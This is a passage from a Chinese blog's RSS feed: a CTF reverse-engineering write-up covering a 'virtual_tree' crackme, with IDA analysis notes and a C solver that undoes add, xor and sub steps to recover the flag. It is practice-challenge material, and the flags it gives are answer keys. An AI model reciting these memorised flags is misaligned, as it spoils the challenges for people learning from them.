class="keyword">char</span>*)&amp;v1+<span class="number">1</span>),*(<span class="keyword">char</span>*)&amp;v1);</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:flag{a_3a2y_re_for_test}</p></blockquote><p><a href="https://buuoj.cn/files/87e77444381db5fdc3136e5587c84d16/attachment.zip?token=eyJ1c2VyX2lkIjo3NzEyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxODA3fQ.XohQEg.SscdnbwID5i-izwLZTAu2EBCtF8" target="_blank" rel="noopener">官方下载链接</a></p><hr><p>撒花完结~这次就写了这么几个题,主要是因为IDA里的反汇编太不熟悉了,以及对基本算法逆向的不熟悉,需要多多做题,多多写wp</p><hr><h1 id="virtual-tree"><a href="#virtual-tree" class="headerlink" title="virtual_tree"></a>virtual_tree</h1><p>(再补一道题)</p><p>这个题动态静态双管齐下</p><p><img src="https://ae01.alicdn.com/kf/H07c0b5590069413893c0e6327ba301578.png" alt=""></p><p>大体结构是这样的</p><p>第一个函数进去乍一看以为是个算法,仔细一看发现根本不会走,判断直接跳过了,然后len=16</p><p><img src="https://ae01.alicdn.com/kf/H1bcace13743c48b48c35f6e2019334119.png" alt=""></p><p>这个树着实麻烦,不过关键代码只有一句,在这里下断点跑一次就可以拿到所有的数据<img src="https://ae01.alicdn.com/kf/H09226253b4ae4b208ad44ca38d787d42z.png" alt=""></p><p>这个game其实挺简单的,不过这是经过处理之后的如果是直接静态来看,会直接懵B</p><img src="https://ae01.alicdn.com/kf/He344e9f70bc648e49e6868a652d2b0adu.png"  /><p>作者坏坏的把名字改了,而且还有一点混淆(作者说这是编译器的问题)</p><p><img src="https://ae01.alicdn.com/kf/H91dcc0c4b2d64b0282aae81f937e3528D.png" alt=""></p><p>具体处理方法是这样的,不过其实没有必要,动态走一遍记录一下跑的地方和参数也是一样的,主要是迷惑性很强</p><p><img src="https://ae01.alicdn.com/kf/H182ef2e3bcec42f9b5852212a43916e2c.png" alt=""></p><p>exp及部分<s>解析</s>唠叨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> key1[]=&#123;<span class="number">0x17</span>,<span class="number">0x63</span>,<span class="number">0x77</span>,<span class="number">0x3</span>,<span class="number">0x52</span>,<span class="number">0x2E</span>,<span class="number">0x4A</span>,<span class="number">0x28</span>,<span class="number">0x52</span>,<span class="number">0x1B</span>,<span class="number">0x17</span>,<span class="number">0x12</span>,<span class="number">0x3A</span>,<span class="number">0x0A</span>,<span class="number">0x6C</span>,<span class="number">0x62</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uadd</span><span class="params">(<span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">key1[b]-=a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uxor</span><span class="params">(<span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">key1[b]^=key1[a];</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usub</span><span class="params">(<span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="comment">/*//没绝对值处理过优先级更高 </span></span><br><span class="line"><span class="comment"> if(key1[b]+key1[a]&lt;0x20&amp;&amp;key1[b]+key1[a]&gt;127)</span></span><br><span class="line"><span class="comment"> key1[b]=-key1[b]+key1[a];</span></span><br><span class="line"><span class="comment"> else key1[b]=key1[b]+key1[a];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/*//被绝对值处理过优先级更高 </span></span><br><span class="line"><span class="comment"> if(-key1[b]+key1[a]&lt;0x20&amp;&amp;-key1[b]+key1[a]&gt;127)</span></span><br><span class="line"><span class="comment"> key1[b]=key1[b]+key1[a];</span></span><br><span class="line"><span class="comment"> else key1[b]=-key1[b]+key1[a];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">key1[b]=key1[b]+key1[a];//一律当作没做过绝对值处理 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">key1[b]=-key1[b]+key1[a];<span class="comment">//一律当作做过绝对值处理</span></span><br><span class="line"> &#125;<span class="comment">//这个反绝对值恶心死我了,多解</span></span><br><span class="line"><span class="comment">//A 0   2 1   7 2   7 3   5 4   1 6   3 7   7 8   8 9   7 A   C B   2 C   F E   2 F   </span></span><br><span class="line"><span class="comment">//ADD   XOR   ADD   SUB   XOR   SUB   ADD   XOR   SUB   SUB   XOR   SUB   XOR   ADD   </span></span><br><span class="line"><span class="comment">//A[0]+A</span></span><br><span class="line"><span class="comment">//A[1]^A[2]</span></span><br><span class="line"><span class="comment">//A[3]=abs(A[3]-A[7])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[<span class="number">17</span>]=&#123;<span class="number">0</span>&#125;; </span><br><span class="line">uadd(<span class="number">2</span>,<span class="number">0xf</span>);</span><br><span class="line">uxor(<span class="number">0xf</span>,<span class="number">0xe</span>);</span><br><span class="line">usub(<span class="number">2</span>,<span class="number">0xc</span>);</span><br><span class="line">uxor(<span class="number">0xc</span>,<span class="number">0xb</span>);</span><br><span class="line">usub(<span class="number">7</span>,<span class="number">0xa</span>);</span><br><span class="line">usub(<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line">uxor(<span class="number">7</span>,<span class="number">8</span>);</span><br><span class="line">uadd(<span class="number">3</span>,<span class="number">7</span>);</span><br><span class="line">usub(<span class="number">1</span>,<span class="number">6</span>);</span><br><span class="line">uxor(<span class="number">5</span>,<span class="number">4</span>);</span><br><span class="line">usub(<span class="number">7</span>,<span class="number">3</span>);</span><br><span class="line">uadd(<span class="number">7</span>,<span class="number">2</span>);</span><br><span class="line">uxor(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">uadd(<span class="number">0xa</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> key2[]=&#123;<span class="number">0x4D</span>,<span class="number">0x4C</span>,<span class="number">0x47</span>,<span class="number">0x50</span>,<span class="number">0x4F</span>,<span class="number">0x4B</span>,<span class="number">0x46</span>,<span class="number">0x43</span>,<span class="number">0x4A</span>,<span class="number">0x45</span>,<span class="number">0x4E</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x42</span>,<span class="number">0x41</span>&#125;; <span class="comment">//这是跑一遍出来的异或的数据</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">input[i]=key1[i]^key2[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:flag{@_7r3e_f0r_fuNN!}</p></blockquote>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2020/04/01/merak-ctf/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
